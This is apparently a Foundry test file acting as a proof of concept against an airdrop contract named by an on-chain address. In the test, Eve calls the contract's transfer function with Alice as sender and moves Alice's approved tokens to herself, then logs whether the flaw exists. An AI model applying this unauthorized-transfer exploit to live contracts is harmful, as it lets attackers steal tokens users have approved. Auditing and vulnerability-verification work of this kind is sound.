// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import "../src/0xe894d54dca59cb53fe9cbc5155093605c7068220.sol";

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint8 public decimals;
    string public name;

    constructor(uint8 _decimals) {
        decimals = _decimals;
        name = "TestToken";
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(allowance[from][msg.sender] >= amount, "Insufficient allowance");
        require(balanceOf[from] >= amount, "Insufficient balance");
        
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        allowance[from][msg.sender] -= amount;
        return true;
    }
}

contract AirDropTest is Test {
    airDrop public airdrop;
    MockERC20 public token;

    address deployer = makeAddr("deployer");
    address alice = makeAddr("alice");
    address eve = makeAddr("eve");

    function setUp() public {
        vm.startPrank(deployer);
        airdrop = new airDrop();
        token = new MockERC20(18);
        vm.stopPrank();

        token.mint(alice, 1000 ether);
        vm.prank(alice);
        token.approve(address(airdrop), 500 ether);
    }

    function testUnauthorizedTokenTransfer() public {
        console.log("--- BEFORE-Trigger Transfer ---");
        // Capture initial token balances and airdrop state
        uint256 aliceBalanceBefore = token.balanceOf(alice);
        uint256 eveBalanceBefore = token.balanceOf(eve);
        uint256 totalDropsBefore = airdrop.totalDrops();
        uint256 totalTokensDistributedBefore = airdrop.totalTokensDistributed();
        uint256 userDropCountEveBefore = airdrop.userDropCount(eve);

        console.log("Alice balance:", aliceBalanceBefore);
        console.log("Eve balance:", eveBalanceBefore);
        console.log("Total drops:", totalDropsBefore);
        console.log("Total tokens distributed:", totalTokensDistributedBefore);
        console.log("Eve's drop count:", userDropCountEveBefore);

        console.log("--- Trigger Unauthorized Transfer ---");
        // Generate transfer parameters
        address[] memory recipients = new address[](1);
        recipients[0] = eve;
        
        // Eve initiates transfer from Alice's address (attack point)
        vm.prank(eve);
        airdrop.transfer(
            alice,                   // from
            address(token),          // token address
            recipients,              // recipient addresses
            300,                     // token amount (in whole tokens)
            token.decimals()         // token decimals
        );

        console.log("--- AFTER-Trigger Transfer ---");
        // Capture state after exploit
        uint256 aliceBalanceAfter = token.balanceOf(alice);
        uint256 eveBalanceAfter = token.balanceOf(eve);
        uint256 totalDropsAfter = airdrop.totalDrops();
        uint256 totalTokensDistributedAfter = airdrop.totalTokensDistributed();
        uint256 userDropCountEveAfter = airdrop.userDropCount(eve);

        console.log("Alice balance:", aliceBalanceAfter);
        console.log("Eve balance:", eveBalanceAfter);
        console.log("Total drops:", totalDropsAfter);
        console.log("Total tokens distributed:", totalTokensDistributedAfter);
        console.log("Eve's drop count:", userDropCountEveAfter);

        // Differential comparison
        console.log("--- Differential State Changes ---");
        bool stateChanged = 
            (aliceBalanceAfter < aliceBalanceBefore) &&
            (eveBalanceAfter > eveBalanceBefore) &&
            (totalDropsAfter > totalDropsBefore) &&
            (totalTokensDistributedAfter > totalTokensDistributedBefore) &&
            (userDropCountEveAfter > userDropCountEveBefore);

        console.log("Attack triggered unauthorized state changes:", stateChanged ? "YES" : "NO");

        // Final vulnerability verdict
        if (stateChanged) {
            console.log("Vulnerability Exists: Unauthorized caller successfully executed token transfer and modified airdrop state");
        } else {
            console.log("Vulnerability not Exist: No illegal state changes detected from unauthorized operation");
        }
    }
}